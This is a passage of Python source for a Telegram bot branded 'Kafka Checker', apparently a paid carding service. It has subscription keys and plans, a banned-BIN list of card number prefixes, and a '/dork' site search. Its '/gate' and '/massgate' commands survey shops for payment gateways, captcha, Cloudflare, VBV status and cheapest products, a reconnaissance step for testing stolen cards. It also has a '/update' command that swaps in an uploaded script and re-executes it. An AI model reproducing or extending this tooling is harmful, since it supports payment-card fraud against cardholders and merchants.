        parse_mode=enums.ParseMode.HTML,
        reply_markup=keyboard
    )

@app.on_callback_query(filters.regex(r"starter_plan"))
async def show_starter_plan(client, callback_query):
    await callback_query.answer(
        "⭐ Starter Plan\n\n💲 Price: $3\n⏳ Duration: 1 Week\n🔓 Access: Full Plus Features", 
        show_alert=True
    )

@app.on_callback_query(filters.regex(r"silver_plan"))
async def show_silver_plan(client, callback_query):
    await callback_query.answer(
        "🌟 Silver Plan\n\n💲 Price: $5\n⏳ Duration: 15 Days\n🔓 Access: Full Plus Features", 
        show_alert=True
    )

@app.on_callback_query(filters.regex(r"gold_plan"))
async def show_gold_plan(client, callback_query):
    await callback_query.answer(
        "🏆 Gold Plan\n\n💲 Price: $8\n⏳ Duration: 1 Month\n🔓 Access: Full Plus Features", 
        show_alert=True
    )

@app.on_callback_query(filters.regex(r"lifetime_plan"))
async def show_lifetime_plan(client, callback_query):
    await callback_query.answer(
        "👑 Lifetime Plan\n\n💲 Price: $25\n⏳ Duration: Lifetime\n🔓 Access: Full Plus Features", 
        show_alert=True
    )

@app.on_callback_query(filters.regex(r"close_plans"))
async def close_plans(client, callback_query):
    await callback_query.edit_message_text("<b>Thanks for using 𝙆𝙖𝙛𝙠𝙖 𝘾𝙝𝙚𝙘𝙠𝙚𝙧!</b>", parse_mode=enums.ParseMode.HTML)

@app.on_message(command_with_mention("latestkey"))
@requires_auth
@requires_plan
@universal_handler
async def latest_key(client, message, user_info, *args, **kwargs):
    user = message.from_user
    if str(user.id) not in the_god_ids:
        await message.reply('⚠️ **You do not have permission to view keys.**')
        return

    expired_keys = remove_expired_keys()
    unredeemed_keys = get_unredeemed_keys()
    unredeemed_keys_count = len(unredeemed_keys)
    expired_keys_count = len(expired_keys)

    expired_keys_text = '\n'.join(expired_keys) if expired_keys else 'None'
    if expired_keys_count > 0:
        await message.reply(f'🗑️ <b>Removed expired keys ({expired_keys_count}):</b>\n<code>{expired_keys_text}</code>', parse_mode=enums.ParseMode.HTML)

    if unredeemed_keys:
        keys_text = '\n'.join(
            [f'☃️ 》<code>{key}</code>\n<b>Created by:</b> {value["created_by"]}\n<b>Created at:</b> {value["created_at"]}\n<b>Expires at:</b> {value["expires_at"]}\n\n'
             for key, value in unredeemed_keys.items()])
        await message.reply(
            f'🔑 <b>Unredeemed keys ({unredeemed_keys_count}):</b>\n{keys_text}', parse_mode=enums.ParseMode.HTML)
    else:
        await message.reply('🔑 <b>No unredeemed keys available.</b>', parse_mode=enums.ParseMode.HTML)

@app.on_message(command_with_mention("banbin"))
@requires_auth
@requires_plan
async def ban_bin_command(client, message, user_info, *args, **kwargs):
    bin_input = message.text.split()[1]
    
    bin_to_ban = bin_input[:6] if re.match(r'^\d{16}|\d{15}$', bin_input.split('|')[0]) else bin_input

    banned_bins = load_banned_bins()

    if bin_to_ban not in banned_bins:
        banned_bins.append(bin_to_ban)
        save_banned_bins(banned_bins)
        await message.reply(f"✅ **BIN {bin_to_ban} has been banned.**")
    else:
        await message.reply(f"⚠️ **BIN {bin_to_ban} is already banned.**")

@app.on_message(command_with_mention("unbanbin"))
@requires_auth
@requires_plan
async def unban_bin_command(client, message, user_info, *args, **kwargs):
    bin_input = message.text.split()[1]
    
    bin_to_unban = bin_input[:6] if re.match(r'^\d{16}|\d{15}$', bin_input.split('|')[0]) else bin_input

    banned_bins = load_banned_bins()

    if bin_to_unban in banned_bins:
        banned_bins.remove(bin_to_unban)
        save_banned_bins(banned_bins)
        await message.reply(f"✅ **BIN {bin_to_unban} has been unbanned.**")
    else:
        await message.reply(f"⚠️ **BIN {bin_to_unban} is not in the banned list.**")

@app.on_message(command_with_mention("ban"))
async def ban(client, message, user_info=None, *args, **kwargs):
    user = message.from_user
    if str(user.id) not in the_god_ids:
        await message.reply('⚠️ **You do not have permission to ban users.😂**')
        return

    if len(message.command) != 2:
        await message.reply('⚠️ **Usage:** /ban <user_id or @username> (e.g., /ban 123456789 or /ban @username)')
        return

    target = message.command[1]
    if target.startswith('@'):
        target_user = await app.get_users(target)
        user_id = target_user.id
    elif target.isdigit():
        user_id = int(target)
    else:
        await message.reply('⚠️ **Invalid user_id or username.**')
        return

    ban_user(user_id)
    await message.reply(f'🚫 **User {user_id} has been banned from using the bot.**')
    logger.info(f'User {user_id} has been banned by {user.username}')


@app.on_message(command_with_mention("unban"))
async def unban(client, message, user_info=None, *args, **kwargs):
    user = message.from_user
    if str(user.id) not in the_god_ids:
        await message.reply('⚠️ **You do not have permission to unban users.😂**')
        return

    if len(message.command) != 2:
        await message.reply('⚠️ **Usage:** /unban {user_id or @username} (e.g., /unban 123456789 or /unban @username)')
        return

    target = message.command[1]
    if target.startswith('@'):
        target_user = await app.get_users(target)
        user_id = target_user.id
    elif target.isdigit():
        user_id = int(target)
    else:
        await message.reply('⚠️ **Invalid user_id or username.**')
        return

    unban_user(user_id)
    await message.reply(f'✅ **User {user_id} has been unbanned and can use the bot again.**')
    logger.info(f'User {user_id} has been unbanned by {user.username}')

@app.on_message(command_with_mention("update"))
@requires_auth
@requires_plan
async def update_script(client, message, user_info, *args, **kwargs):
    try:
        plan = user_info.get('plan')
        if plan != "The God":
            await message.reply("⚠️ You do not have permission to use this command.", parse_mode=enums.ParseMode.HTML)
            return

        if message.reply_to_message and message.reply_to_message.document:
            
            new_file_path = await message.reply_to_message.download()
            old_file_path = os.path.abspath(__file__)
            backup_file_path = old_file_path + ".bak"

            try:
                
                shutil.move(old_file_path, backup_file_path)
                
                shutil.move(new_file_path, old_file_path)

                
                vietnam_timezone = timezone(timedelta(hours=7))
                current_time = datetime.now(vietnam_timezone).strftime("%d-%m-%Y | %H:%M:%S")

                
                await message.reply(f"✅ <b>Script updated successfully at {current_time}\n> Restarting bot...</b>", parse_mode=enums.ParseMode.HTML)

                
                os.execl(sys.executable, sys.executable, *sys.argv)

            except Exception as e:
                await message.reply(f"❌ <b>Failed to update script:</b> {str(e)}", parse_mode=enums.ParseMode.HTML)
                
                
                shutil.move(backup_file_path, old_file_path)
        else:
            await message.reply("⚠️ <b>Please reply to a file containing the updated ka.py script.</b>", parse_mode=enums.ParseMode.HTML)

    except Exception as e:
        logger.error(f"Error in update_script: {e}")
        await message.reply(f"❌ <b>Error while updating:</b> {str(e)}", parse_mode=enums.ParseMode.HTML)
        

@app.on_message(command_with_mention("updata"))
@requires_auth
@requires_plan
@anti_spam
@universal_handler
async def update_users_file(client, message, user_info, *args, **kwargs):
    
    if user_info.get('plan') != 'The God':
        await message.reply("⚠️ <b>You do not have permission to use this command.</b>", parse_mode=enums.ParseMode.HTML)
        return

    
    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply("⚠️ <b>Please reply to a JSON file to update users.json.</b>", parse_mode=enums.ParseMode.HTML)
        return

    
    if message.reply_to_message.document.file_name != 'users.json':
        await message.reply("⚠️ <b>The file must be named 'users.json'.</b>", parse_mode=enums.ParseMode.HTML)
        return

    
    file_path = await message.reply_to_message.download()

    try:
        with open(file_path, 'r') as file:
            new_data = json.load(file)

        with open('users.json', 'r') as users_file:
            current_data = json.load(users_file)

        current_data.update(new_data)

        with open('users.json', 'w') as users_file:
            json.dump(current_data, users_file, indent=4)

        await message.reply("✅ <b>users.json has been successfully updated.</b>", parse_mode=enums.ParseMode.HTML)

    except json.JSONDecodeError:
        await message.reply("⚠️ <b>The file is not a valid JSON file.</b>", parse_mode=enums.ParseMode.HTML)

    except Exception as e:
        await message.reply(f"⚠️ <b>Error updating users.json:</b> {str(e)}", parse_mode=enums.ParseMode.HTML)

    finally:
        os.remove(file_path)       

@app.on_message(command_with_mention("downgrade"))
async def downgrade_plan(client, message):
    if str(message.from_user.id) not in the_god_ids:
        await message.reply("⚠️ You do not have permission to use this command.")
        return

    if len(message.command) < 2:
        await message.reply("⚠️ Please specify a username to downgrade their plan to Free.")
        return
    
    username = message.command[1].lstrip('@').lower()
    print(f"Username provided: {username}")

    try:
        users = load_json_file(users_file)
        if users is None:
            print("Failed to load users.json")
            await message.reply("⚠️ Failed to load users file.")
            return
    except Exception as e:
        print(f"Error loading users.json: {e}")
        await message.reply("⚠️ An error occurred while loading users.")
        return
    
    user_id = None
    for uid, user_data in users.items():
        stored_username = user_data.get('username')
        if stored_username:
            stored_username = stored_username.lstrip('@').lower()
            print(f"Checking against stored username: {stored_username}")
            if stored_username == username:
                user_id = uid
                print(f"User ID found: {user_id}")
                break
    
    if user_id is None:
        print("User ID is still None after checking all users.")
        await message.reply(f"⚠️ User @{username} not found.")
        return

    print(f"User plan: {users[user_id]['plan']}")
    if users[user_id]['plan'] != 'Plus':
        await message.reply(f"⚠️ User @{username} is not on the Plus plan.")
        return

    users[user_id]['plan'] = 'Free'
    users[user_id]['expires_at'] = None
    save_json_file(users, users_file)

    keys = load_json_file(keys_file)
    if keys is None:
        print("Failed to load keys.json")
        await message.reply("⚠️ Failed to load keys file.")
        return

    for key, key_data in list(keys.items()):
        if key_data.get('redeemed_by') == user_id:
            print(f"Deleting key: {key}")
            del keys[key]
    
    save_json_file(keys, keys_file)

    await message.reply(f"✅ User @{username}'s plan has been downgraded to Free and their key has been removed.")
     
@app.on_message(command_with_mention("dash"))
@requires_auth
@requires_plan
async def dashboard(client, message, user_info, *args, **kwargs):
    plan = user_info.get('plan')
    
    if plan != "The God":
        await message.reply("⚠️ You do not have permission to use this command.", parse_mode=enums.ParseMode.HTML)
        return

    users_data = load_json_file('users.json')
    groups_data = load_json_file('groups.json')
    banned_users_data = load_json_file('ban.json')
    banned_bins_data = load_json_file('bins.json')
    keys_data = load_json_file('keys.json')

    total_users = len(users_data)
    plus_plan_users = sum(1 for user in users_data.values() if user.get('plan') == 'Plus')
    free_plan_users = sum(1 for user in users_data.values() if user.get('plan') == 'Free')
    admin_users = sum(1 for user in users_data.values() if user.get('plan') == 'Admin')
    the_god_users = sum(1 for user in users_data.values() if user.get('plan') == 'The God')
    auth_groups = len(groups_data)
    banned_users = len(banned_users_data)
    banned_bins = len(banned_bins_data)
    total_keys = len(keys_data)

    dashboard_message = (
        "📊 <b>Kafka Dashboard</b> 🌟\n"
        "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n"
        f"👥 <b>Total Users:</b> <code>{total_users}</code>\n"
        f"💎 <b>Plus Plan Users:</b> <code>{plus_plan_users}</code>\n"
        f"📦 <b>Free Plan Users:</b> <code>{free_plan_users}</code>\n"
        f"🛡️ <b>Admin Users:</b> <code>{admin_users}</code>\n"
        f"👑 <b>The God Users:</b> <code>{the_god_users}</code>\n"
        "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
        f"🔒 <b>Authorized Groups:</b> <code>{auth_groups}</code>\n"
        f"🚫 <b>Banned Users:</b> <code>{banned_users}</code>\n"
        f"🛑 <b>Banned BINs:</b> <code>{banned_bins}</code>\n"
        f"🔑 <b>Total Keys:</b> <code>{total_keys}</code>\n"
        "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
        f"📅 <b>Date:</b> <code>{datetime.now().strftime('%Y-%m-%d')}</code>\n"
        f"⏰ <b>Time:</b> <code>{datetime.now().strftime('%H:%M:%S')}</code>\n"
        "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
    )

    await message.reply(dashboard_message, parse_mode=enums.ParseMode.HTML)

@app.on_message(command_with_mention("send"))
@requires_auth
async def send_message(client, message, user_info, *args, **kwargs):
    plan = user_info.get('plan')
    
    if plan != "The God":
        await message.reply("⚠️ You do not have permission to use this command.", parse_mode=enums.ParseMode.HTML)
        return

    if len(message.command) > 1:
        target = message.command[1]
        if target == "@all":
            try:
                with open('users.json', 'r', encoding='utf-8') as f:
                    users_data = json.load(f)
                    user_list = list(users_data.keys())
                    user_list = [int(user_id) for user_id in user_list]
            except (FileNotFoundError, json.JSONDecodeError) as e:
                await message.reply(f"⚠️ Error loading user list: {str(e)}")
                return
        elif target.startswith("@") or target.isdigit():
            user_list = [target]
            try:
                user_list = [int(user_list[0])]
            except ValueError:
                pass
        else:
            await message.reply("⚠️ Invalid user ID or username.")
            return
    else:
        await message.reply("⚠️ Please specify a target user ID, @username, or @all.")
        return

    if message.reply_to_message:
        if message.reply_to_message.text:
            content_type = 'text'
            content = message.reply_to_message.text
        elif message.reply_to_message.document:
            content_type = 'document'
            content = message.reply_to_message.document.file_id
        else:
            await message.reply("⚠️ Unsupported content type.")
            return
    else:
        await message.reply("⚠️ Please reply to the message you want to send.")
        return

    for user in user_list:
        try:
            if content_type == 'text':
                await client.send_message(int(user), content)
            elif content_type == 'document':
                await client.send_document(int(user), content)
        except Exception as e:
            print(f"Error sending message to {user}: {e}") #Remove or comment out in production
            pass  # Ignore errors
        time.sleep(0.5) # Adjust delay as needed

@app.on_message(command_with_mention("restart"))
@requires_auth
@requires_plan
async def restart_bot(client, message, user_info, *args, **kwargs):
    plan = user_info.get('plan', 'Free')
    
    if plan not in ['Admin', 'The God']:
        await message.reply("❌ <b>You don't have permission to restart the bot.</b>", parse_mode=enums.ParseMode.HTML)
        return

    await message.reply("🔄 <b>Bot is restarting...</b>", parse_mode=enums.ParseMode.HTML)

    os.execv(sys.executable, ['python'] + sys.argv)

@app.on_message(command_with_mention("auth"))
async def auth_group(client, message):
    user = message.from_user
    if str(user.id) not in the_god_ids and str(user.id) not in admin_ids:
        await message.reply('⚠️ **You do not have permission to authorize groups.**')
        return

    if message.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
        groups = load_groups()
        group_id = str(message.chat.id)
        if group_id not in groups:
            groups[group_id] = {'authorized_by': user.id, 'authorized_at': datetime.now(timezone.utc).strftime('%d-%m-%Y')}
            save_groups(groups)
            await message.reply('✅ **This group has been authorized to use the bot.**')
        else:
            await message.reply('⚠️ **This group is already authorized.**')
    else:
        await message.reply('⚠️ **This command can only be used in groups.**')

@app.on_message(command_with_mention("referral") | command_with_mention("invite"))
@requires_auth
@requires_plan
@universal_handler
async def generate_referral_link(client, message, user_info, *args, **kwargs):
    user = message.from_user
    bot = await client.get_me()
    referral_link = f"https://t.me/{bot.username}?start={user.id}"
    await message.reply(
        f"📩 <b>Here is your referral/invite link:</b>\n\n"
        f"<b>[⚡️]></b>{referral_link}\n\n"
        f"<b>🔥 Share this link to invite others to join!\n🛍 7 invites = 8 days Plus 🎊</b>",
        parse_mode=enums.ParseMode.HTML,
        disable_web_page_preview=True
    )
    logger.info(f'Referral link created by {user_info["username"]}: {referral_link}')

@app.on_message(command_with_mention(["info", "user", "status", "me"]))
@requires_auth
@requires_plan
@universal_handler
async def info(client, message, user_info, *args, **kwargs):
    if message.reply_to_message:
        target_user_id = message.reply_to_message.from_user.id
        target_username = message.reply_to_message.from_user.username
    elif len(message.text.split()) > 1:
        target_username = message.text.split()[1].replace('@', '')
        try:
            target_user = await client.get_users(target_username)
            target_user_id = target_user.id
            target_username = target_user.username
        except:
            await message.reply("⚠️ <b>User not found.</b>", parse_mode=enums.ParseMode.HTML)
            return
    else:
        target_user_id = message.from_user.id
        target_username = message.from_user.username

    target_user_info = get_user_info(target_user_id)

    if not target_user_info:
        await message.reply("⚠️ <b>User not found in the database.</b>", parse_mode=enums.ParseMode.HTML)
        return

    full_name = target_user_info.get('full_name', '')
    plan = target_user_info.get('plan', '')
    registered_at = target_user_info.get('registered_at', '')
    expires_at = target_user_info.get('expires_at', '')
    referrals = target_user_info.get('referrals', 0)

    reply_message = (
        f"<b>User Information</b>\n"
        f"———————\n"
        f"¤ {full_name}\n\n"
        f"- <b>ID:</b> <code>{target_user_id}</code>\n"
        f"- <b>Username:</b> @{target_username}\n"
        f"- <b>Plan:</b> {plan}\n\n"
        f"☆ <b>Joined At:</b> {registered_at}\n"
        f"◇ <b>Referrals:</b> {referrals}\n"
    )

    if expires_at:
        reply_message += f"★ <b>Expires At:</b> {expires_at}\n"

    await message.reply(reply_message, parse_mode=enums.ParseMode.HTML)

@app.on_message(command_with_mention("clearusers"))
async def clear_users(client, message):
    user = message.from_user
    if str(user.id) in the_god_ids:
        with open(users_file, 'w') as f:
            f.write('{}')
        await message.reply('🗑️ **All user data has been cleared.**')
        logger.info('User data cleared by admin.')
    else:
        await message.reply('⚠️ **You do not have permission to clear user data.**')

@app.on_message(command_with_mention("clearkeys"))
async def clear_keys(client, message):
    user = message.from_user
    if str(user.id) in the_god_ids:
        with open(keys_file, 'w') as f:
            f.write('{}')
        await message.reply('🗑️ **All keys have been cleared.**')
        logger.info('Keys cleared by admin.')
    else:
        await message.reply('⚠️ **You do not have permission to clear keys.**')

@app.on_message(command_with_mention("key"))
async def create_key(client, message):
    user = message.from_user
    if str(user.id) not in the_god_ids:
        await message.reply('⚠️ **You do not have permission to create keys.**')
        return

    parts = message.text.split()
    if len(parts) != 3:
        await message.reply('⚠️ **Usage:** /key <amount> <duration> (e.g., /key 3 3d)')
        return

    try:
        amount = int(parts[1])
        duration = parse_duration(parts[2])
        if not duration:
            raise ValueError()
    except ValueError:
        await message.reply('⚠️ **Invalid amount or duration.**')
        return

    keys = load_json_file(keys_file)
    created_keys = []
    for _ in range(amount):
        key = generate_key('kafka_plus_')
        expiration_date = datetime.now(timezone.utc) + duration
        keys[key] = {
            'created_by': user.username,
            'created_at': datetime.now(timezone.utc).strftime('%d-%m-%Y'),
            'expires_at': expiration_date.strftime('%d-%m-%Y'),
            'redeemed_by': None,
            'redeemed_at': None
        }
        created_keys.append(key)
    save_json_file(keys, keys_file)
    keys_text = '\n'.join([f'¡ `{key}`\n' for key in created_keys])
    await message.reply(
        f'**🔑 Keys created successfully**\n\n'
        f'》》》》》》\n\n'
        f'{keys_text}\n\n'
        f'—○——○——○——○—\n'
        f'📋 **Quantity:** {amount}\n'
        f'⌛ **Expires In:** {parts[2]}\n'
        f'👤 **Created By:** {user.username}'
        f'\n\n**☆🤔How to redeem?**\n\n**🥂Use : **`/redeem kafka_plus_....` **(replace with yours key)**'
    )
    logger.info(f'Keys created by {user.username}: {amount} keys for {parts[2]}')

@app.on_message(command_with_mention("redeem"))
@requires_plan
@universal_handler
async def redeem_key(client, message, user_info, *args, **kwargs):
    user = message.from_user
    if str(user.id) in the_god_ids:
        await message.reply('⚠️ **You are The God. You do not need to redeem keys.**')
        return

    if str(user.id) in admin_ids:
        await message.reply('⚠️ **You are an Admin. You do not need to redeem keys.**')
        return

    parts = message.text.split()
    if len(parts) != 2:
        await message.reply('⚠️ **Usage:** /redeem <key> (e.g., /redeem kafka_plus_...)')
        return

    key = parts[1]
    keys = load_json_file(keys_file)
    if key not in keys:
        await message.reply('⚠️ **Invalid key.**')
        return

    if keys[key]['redeemed_by']:
        await message.reply('⚠️ **This key has already been redeemed.**')
        return

    expiration_date = datetime.strptime(keys[key]['expires_at'], '%d-%m-%Y')
    current_date = datetime.now(timezone.utc).date()

    if user_info['expires_at']:
        current_plan_expiration = datetime.strptime(user_info['expires_at'], '%d-%m-%Y').date()
        if current_date <= current_plan_expiration:
            await message.reply('⚠️ **You cannot redeem a new key until your current plan expires.**')
            return

    user_info['plan'] = 'Plus'
    user_info['expires_at'] = expiration_date.strftime('%d-%m-%Y')
    keys[key]['redeemed_by'] = user.username
    keys[key]['redeemed_at'] = datetime.now(timezone.utc).strftime('%d-%m-%Y')

    users = load_json_file(users_file)
    users[str(user.id)] = user_info

    save_json_file(users, users_file)
    save_json_file(keys, keys_file)

    await message.reply(
        f'🎉 **Key Redeemed Successfully!**\n'
        f'———•————•—\n'
        f'🔑 **Key:** `{key}`\n'
        f'———•————•—\n\n'
        f'👑 **Created By:** @{keys[key]["created_by"]}\n'
        f'🎁 **Created At:** {keys[key]["created_at"]}\n\n'
        f'👤 **Redeemed By:** @{user.username}\n'
        f'🪄 **Redeemed At:** {keys[key]["redeemed_at"]}\n\n'
        f'———🔥——•—\n'
        f'🛎 **Expires At:** {keys[key]["expires_at"]}\n'
    )
    logger.info(f'Key redeemed by {user.username}: {key}')

#--------------Backup Part--------------



files_to_backup = ['users.json', 'keys.json', 'groups.json', 'ban.json', 'ka.py', 'bins.json']

def zf(files, zip_name):
    with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as z:
        for f in files:
            if os.path.exists(f):
                try:
                    z.write(f, os.path.relpath(f))
                except:
                    pass

async def bfk(client):
    zip_name = f"backup_{datetime.now().strftime('%Y%m%d%H%M%S')}.zip"
    try:
        zf(files_to_backup, zip_name)
        if not os.path.exists(zip_name):
            return
        success = True
        for gid in [1192484969, 1469152765]:
            try:
                await client.send_document(gid, zip_name, caption='📦 Backup of Kafka Checker Bot files')
            except:
                success = False
        os.remove(zip_name)
        return success
    except:
        pass

@app.on_message(filters.command("backup") & filters.user([1192484969, 1469152765]))
async def mbk(client, message):
    success = await bfk(client)
    if success:
        await message.reply("✅ Backup completed and sent to The God users.")
    else:
        await message.reply("⚠️ Backup completed with some errors.")

async def sbk(client):
    while True:
        await bfk(client)
        await asyncio.sleep(1200)

@app.on_message(filters.command("autobackup") & filters.user([1192484969, 1469152765]))
async def start_bkp_cmd(client, message):
    asyncio.create_task(sbk(client))
    await message.reply("🔄 Automated backup every 20 minutes has started.")


#--------------Tools Part--------------

#dork cmd
@app.on_message(command_with_mention("dork"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
async def dork(client, message, user_info, *args, **kwargs):
    asyncio.create_task(process_dork(client, message, user_info, *args, **kwargs))

async def process_dork(client, message, user_info, *args, **kwargs):
    user = message.from_user
    user_id = str(user.id)
    plan = user_info.get('plan', 'Free')

    if plan == 'Free':
        can_use, msg = check_usage(user_id, plan, chat_id=message.chat.id)
        if not can_use:
            await message.reply(msg, parse_mode=enums.ParseMode.HTML)
            return

    message_text = message.text.split()
    if len(message_text) < 2:
        await message.reply('⚠️ <b>Usage:</b> <code>/dork query</code>', parse_mode=enums.ParseMode.HTML)
        return

    query = ' '.join(message_text[1:])
    progress_message = await message.reply(f'🔍 <b>Dorking now...</b>', parse_mode=enums.ParseMode.HTML)

    api_url = f"https://172.18.0.55:5000/search={query}"
    start_time = time.time()

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as response:
                if response.status == 200:
                    html_content = await response.text()
                    urls = extract_urls_from_html(html_content)

                    if not urls:
                        await progress_message.delete()
                        await message.reply(f'⚠️ <b>No URLs found for keywords:</b> <code>{query}</code>', parse_mode=enums.ParseMode.HTML)
                        return

                    filename = f"found_{len(urls)}_{time.strftime('%H_%M_%S')}.txt"
                    with open(filename, 'w', encoding='utf-8') as file:
                        file.write('\n'.join(urls))

                    elapsed_time = time.time() - start_time
                    caption = (
                        f"📋 <b>Amount of URLs:</b> <code>{len(urls)}</code>\n"
                        f"⏱️ <b>Took:</b> <code>{elapsed_time:.2f} seconds</code>\n"
                        f"👤 Dork by: @{user.username if user.username else user.first_name} [{plan}]"
                    )

                    await progress_message.delete()
                    await message.reply(f"🔑 Keywords: {query}", parse_mode=enums.ParseMode.HTML)
                    await client.send_document(message.chat.id, filename, caption=caption, parse_mode=enums.ParseMode.HTML)
                    os.remove(filename)

                else:
                    await progress_message.delete()
                    await message.reply(f'⚠️ API request failed with status code: {response.status}', parse_mode=enums.ParseMode.HTML)
    except aiohttp.ClientError as e:
        await progress_message.delete()
        await message.reply('⚠️ An error occurred while fetching data. Please try again later.', parse_mode=enums.ParseMode.HTML)
    except Exception as e:
        await progress_message.delete()
        await message.reply(f'⚠️ An unexpected error occurred: {type(e).__name__}: {str(e)}', parse_mode=enums.ParseMode.HTML)


def extract_urls_from_html(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    urls = [link.get('href') for link in soup.find_all('a', href=True) if link.get('href').startswith("http")]
    return urls          

#-----------------------------------
url_states = {}
user_rate_limit = {}

def ensure_url_format(url):
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    return url

def extract_urls_from_text(text):
    url_pattern = re.compile(r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+')
    return url_pattern.findall(text)

def extract_info_from_html(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    pre_tag = soup.find('pre')
    if pre_tag:
        json_content = pre_tag.text
        return json.loads(json_content)
    return {}

def get_random_emojis():
    emojis = ["🦊", "🦝", "🐱", "🐻", "🦁", "🐯"]
    return ''.join(random.choices(emojis, k=3))

@app.on_message(command_with_mention("gate"))
@requires_auth
@requires_plan
@anti_spam
@universal_handler
async def check_gateways(client, message, user_info, *args, **kwargs):
    asyncio.create_task(process_gateways(client, message, user_info, *args, **kwargs))

async def check_url(session, url):
    short_identifier = str(len(url_states))
    start_time = time.time()
    try:
        api_url = f"https://gatev2.onrender.com/gatev2?url={url}"
        async with session.get(api_url) as response:
            response_time = time.time() - start_time

            if response.status == 200:
                data = await response.json()
                site = data.get("site", "N/A")
                http_status_code = data.get("http_status_code", "Unknown")
                payment_methods = ", ".join(data.get("payment_methods", []))
                captcha = data.get("captcha", "False")
                cloudflare = data.get("cloudflare", "False")
                platform = data.get("platform", "Unknown")
                server_info = data.get("server_info", "N/A")
                auth_gate = data.get("auth_gate", False)
                vbv = data.get("vbv", False)
                cheapest_products = data.get("cheapest_products", [])
                pure_check = data.get("pure_check", [])

                cheapest_products_text = ""
                if cheapest_products:
                    cheapest_products_text = "\n<b>Cheapest Products:</b>\n" + "\n".join(
                        [f"<b>Title:</b> {prod['title']}\n<b>Price:</b> <code>${prod['price']}</code>\n<b>URL:</b> <code>{prod['url']}</code>" for prod in cheapest_products]
                    )

                pure_check_text = ""
                if pure_check:
                    pure_check_text = "\n<b>Pure Check Results:</b>\n" + "\n".join(
                        [f"<b>Title:</b> {item['title']}\n<b>Price:</b> <code>${item['price']}</code>\n<b>Result:</b> {item['pure_check']}\n<b>URL:</b> <code>{item['link']}</code>" for item in pure_check]
                    )

                old_message_text = (
                    f"▰▱▰▱▰▱▰▱\n\n"
                    f"<b>Site:</b> <code>{site}</code>\n\n"
                    f"<b>HTTP Status Code:</b> <code>{http_status_code}</code>\n"
                    f"✦─ ─ ─ ─ ✦✦ ─ ─ ─ ─✦\n"
                    f"<b>Payment Methods:</b> <code>{payment_methods}</code>\n\n"
                    f"<b>Captcha:</b> {captcha}\n"
                    f"<b>Cloudflare:</b> {cloudflare}\n\n"
                    f"✦─ ─ ─ ─ ✦✦ ─ ─ ─ ─✦\n"
                    f"<b>Platform:</b> <code>{platform}</code>\n"
                    f"<b>Server Info:</b> <code>{server_info}</code>\n\n"
                    f"<b>Auth Gate:</b> <code>{auth_gate}</code>\n"
                    f"<b>VBV:</b> <code>{vbv}</code>\n"
                    f"{cheapest_products_text}\n"
                    f"{pure_check_text}\n"
                    f"▰▱▰▱▰▱▰▱\n"
                    f"<b>Time Taken:</b> <code>{response_time:.2f} seconds</code>\n\n"
                )

                url_states[short_identifier] = {
                    "old_message_text": old_message_text,
                    "url": url
                }

                return old_message_text

            else:
                return f"Error accessing the API for URL: {url}"

    except Exception as e:
        return f"Error checking URL: {url}\n{str(e)}"

async def process_gateways(client, message, user_info, *args, **kwargs):
    message_text = message.text.split()
    if len(message_text) < 2:
        await message.reply("⚠️ <b>Usage:</b> /gate {url1} <url2> ...", disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
        return

    urls = message_text[1:]

    random_emojis = get_random_emojis()

    checking_message = await message.reply(f"<b>Checking...</b> {random_emojis}", parse_mode=enums.ParseMode.HTML, disable_web_page_preview=True)

    async with aiohttp.ClientSession() as session:
        tasks = []
        for url in urls:
            tasks.append(check_url(session, url))

        results = await asyncio.gather(*tasks, return_exceptions=True)

        response_messages = []
        for result in results:
            if isinstance(result, Exception):
                response_messages.append(f"⚠️ Error: {str(result)}")
            else:
                response_messages.append(result)

        await checking_message.edit("\n\n".join(response_messages), parse_mode=enums.ParseMode.HTML, disable_web_page_preview=True)


#massgate

@app.on_message(command_with_mention("massgate"))
@requires_auth
@requires_plan
@anti_spam
@universal_handler
async def massgate(client, message, user_info, *args, **kwargs):
    asyncio.create_task(massgate_process(client, message, user_info, *args, **kwargs))

async def massgate_process(client, message, user_info, *args, **kwargs):
    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply("⚠️ <b>Please reply to a file with URLs to check.</b>", parse_mode=enums.ParseMode.HTML)
        return

    file_path = await message.reply_to_message.download()

    with open(file_path, "r") as file:
        urls = [line.strip() for line in file.readlines()]

    plan = user_info.get('plan', 'Free')
    max_urls = 100 if plan not in ['Admin', 'The God'] else 10000
    urls = urls[:max_urls]

    if not urls:
        await message.reply("⚠️ <b>No URLs found in the file.</b>", parse_mode=enums.ParseMode.HTML)
        return

    user_id = str(message.from_user.id)
    checked_urls = 0
    left_urls = len(urls)

    notification_message = await message.reply(
        f"🛠️ <b>URL check in progress:</b>\n\n"
        f"👤 <b>User:</b> @{message.from_user.username}\n"
        f"🔄 <b>Checked:</b> {checked_urls}\n"
        f"⏳ <b>Left:</b> {left_urls}",
        parse_mode=enums.ParseMode.HTML,
        disable_web_page_preview=True
    )

    async with aiohttp.ClientSession() as session:
        for url in urls:
            try:
                response_text = await check_massgate_url(session, url)
                checked_urls += 1
                left_urls -= 1

                if checked_urls % 5 == 0:
                    await notification_message.edit_text(
                        f"🛠️ <b>URL check in progress:</b>\n\n"
                        f"👤 <b>User:</b> @{message.from_user.username}\n"
                        f"🔄 <b>Checked:</b> {checked_urls}\n"
                        f"⏳ <b>Left:</b> {left_urls}",
                        parse_mode=enums.ParseMode.HTML,
                        disable_web_page_preview=True
                    )

                await message.reply(response_text, parse_mode=enums.ParseMode.HTML, disable_web_page_preview=True)

            except Exception as e:
                await message.reply(f"⚠️ <b>Error checking URL:</b> {url}\n<b>Reason:</b> {str(e)}", parse_mode=enums.ParseMode.HTML)

